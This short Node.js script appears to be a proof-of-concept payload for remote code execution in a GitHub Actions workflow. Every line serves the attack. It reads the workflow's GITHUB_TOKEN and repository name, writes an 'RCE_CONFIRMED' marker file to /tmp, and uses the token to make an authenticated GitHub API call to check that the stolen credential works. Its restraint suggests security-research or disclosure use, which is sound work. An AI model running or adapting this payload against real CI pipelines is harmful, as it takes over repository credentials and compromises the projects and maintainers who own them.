const fs = require('fs');
const token = process.env.GITHUB_TOKEN || '';
const repo = process.env.GITHUB_REPOSITORY || '';
fs.writeFileSync('/tmp/ADP_RCE_MARKER', 'RCE_CONFIRMED token_present=' + (token ? 'yes' : 'no') + ' repo=' + repo);
if (token && repo) {
  fetch('https://api.github.com/repos/' + repo + '/pulls/10', {
    headers: { Authorization: 'Bearer ' + token, Accept: 'application/vnd.github+json' }
  }).then(r => r.text()).then(t => {
    let title = '';
    try { title = JSON.parse(t).title || ''; } catch (e) {}
    fs.appendFileSync('/tmp/ADP_RCE_MARKER', ' api_status=' + (title ? 'authenticated-ok' : 'failed'));
  }).catch(() => {});
}
